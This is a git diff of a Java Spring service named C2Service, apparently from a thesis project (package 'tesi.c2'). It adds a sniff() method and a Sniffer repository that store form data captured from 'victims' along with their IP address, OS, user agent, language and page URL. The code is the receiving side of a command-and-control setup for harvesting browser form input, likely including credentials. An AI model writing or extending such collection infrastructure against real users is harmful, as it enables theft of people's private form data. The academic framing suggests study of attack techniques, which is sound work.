@@ -2,8 +2,10 @@ package it.ssri.tesi.c2.service;
 
 import it.ssri.tesi.c2.dto.VictimDto;
 import it.ssri.tesi.c2.model.Configuration;
+import it.ssri.tesi.c2.model.Sniffer;
 import it.ssri.tesi.c2.model.Victim;
 import it.ssri.tesi.c2.repository.ConfigurationRepository;
+import it.ssri.tesi.c2.repository.SnifferRepository;
 import it.ssri.tesi.c2.repository.VictimRepository;
 import lombok.RequiredArgsConstructor;
 import lombok.SneakyThrows;
@@ -16,6 +18,8 @@ import java.security.SecureRandom;
 import java.time.Instant;
 import java.util.Base64;
 import java.util.Map;
+import java.util.Set;
+import java.util.stream.Collectors;
 
 @Slf4j
 @Service
@@ -24,6 +28,7 @@ public class C2Service {
 
     private final ConfigurationRepository configurationRepository;
     private final VictimRepository victimRepository;
+    private final SnifferRepository snifferRepository;
 
     public VictimDto manageAttack(Map<String, String> data) {
         if(data.containsKey("action")) {
@@ -118,6 +123,29 @@ public class C2Service {
 
     private static String getUUID(Map<String, String> data) {
         return data.get("id");
+    }
+
+    public void sniff(Map<String, String> data) {
+        Set<String> keys = Set.of("uuid", "os", "user_agent", "lang", "ip_address", "url");
+
+        Map<String, String> formData = data.entrySet().stream()
+                .filter(e -> !keys.contains(e.getKey()))
+                .collect(Collectors.toMap(
+                        Map.Entry::getKey,
+                        Map.Entry::getValue
+                ));
+
+        Sniffer sniffer = Sniffer.builder()
+                .victimId(data.get("uuid"))
+                .sniffDate(Instant.now())
+                .os(data.get("os"))
+                .userAgent(data.get("user_agent"))
+                .language(data.get("lang"))
+                .ipAddress(data.get("ip_address"))
+                .url(data.get("url"))
+                .data(formData.toString())
+                .build();
+        snifferRepository.save(sniffer);
     }
 
 }
